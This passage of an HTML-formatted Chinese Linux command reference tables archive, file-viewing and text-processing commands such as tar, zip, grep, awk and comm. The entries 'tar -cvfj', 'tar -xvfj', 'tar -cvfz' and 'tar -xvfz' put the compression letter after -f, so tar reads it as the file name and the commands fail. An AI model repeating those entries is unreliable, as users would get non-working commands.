</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    压缩一个叫做<span class="s52">&#39;file1&#39;</span>的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # gzip -9 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    最大程度压缩
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rar a file1.rar test_file
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个叫做<span class="s52">&#39;file1.rar&#39; </span>的包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rar a file1.rar file1 file2 dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    同时压缩<span class="s52">&#39;file1&#39;, &#39;file2&#39; </span>以及目录<span class="s52">&#39;dir1&#39;</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rar x file1.rar
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压 <span class="s52">rar </span>包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -cvf archive.tar file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个非压缩的<span class="s52">tarball</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -cvf archive.tar file1 file2 dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个包含了<span class="s52">&#39;file1&#39;, &#39;file2&#39; </span>以及 <span class="s52">&#39;dir1&#39;</span>的档案文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -tf archive.tar
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一个包中的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -xvf archive.tar
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    释放一个包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -xvf archive.tar -C /tmp
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将压缩包释放到<span class="s52">/tmp </span>目录下
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -cvfj archive.tar.bz2 dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个 <span class="s52">bzip2 </span>格式的压缩包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -xvfj archive.tar.bz2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压一个 <span class="s52">bzip2 </span>格式的压缩包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -cvfz archive.tar.gz dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个 <span class="s52">gzip </span>格式的压缩包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tar -xvfz archive.tar.gz
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压一个 <span class="s52">gzip </span>格式的压缩包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # unrar x file1.rar
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压 <span class="s52">rar </span>包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # unzip file1.zip
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    解压一个 <span class="s52">zip </span>格式压缩包
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # zip file1.zip file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个 <span class="s52">zip </span>格式的压缩包
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # zip -r file1.zip file1 file2 dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将几个文件和目录同时压缩成一个 <span class="s52">zip </span>格式的压缩包
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark51">查看文件内容</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从第一个字节开始正向查看文件的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # head -2 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看一个文件的前两行
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # less file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    类似于<span class="s52">&#39;more&#39; </span>命令，但是它允许在文件中和正向操作一样的反向操作
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # more file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看一个长文件的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tac file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从最后一行开始反向查看一个文件的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tail -2 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看一个文件的最后两行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tail -f /var/log/messages
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    实时查看被添加到一个文件中的内容
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark52">文本处理</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat example.txt | awk &#39;NR%2==1&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除 <span class="s52">example.txt </span>文件中的所有偶数行
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # echo a b c | awk &#39;{print $1}&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看一行第一栏
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # echo a b c | awk &#39;{print $1,$3}&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看一行的第一和第三栏
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat -n file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    标示文件的行数
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # comm -1 file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    比较两个文件的内容只删除<span class="s52">&#39;file1&#39; </span>所包含的内容
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # comm -2 file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    比较两个文件的内容只删除<span class="s52">&#39;file2&#39; </span>所包含的内容
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # comm -3 file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    比较两个文件的内容只删除两个文件共有的部分
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # diff file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    找出两个文件内容的不同处
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # grep Aug /var/log/messages
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在文件<span class="s52">&#39;/var/log/messages&#39;</span>中查找关键词<span class="s52">&quot;Aug&quot;</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # grep ^Aug /var/log/messages
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在文件<span class="s52">&#39;/var/log/messages&#39;</span>中查找以<span class="s52">&quot;Aug&quot;</span>开始的词汇
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # grep [0-9] /var/log/messages
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    选择<span class="s52">&#39;/var/log/messages&#39; </span>文件中所有包含数字的行
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # grep Aug -R /var/log/*
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在目录<span class="s52">&#39;/var/log&#39; </span>及随后的目录中搜索字符串<span class="s52">&quot;Aug&quot;</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # paste file1 file2
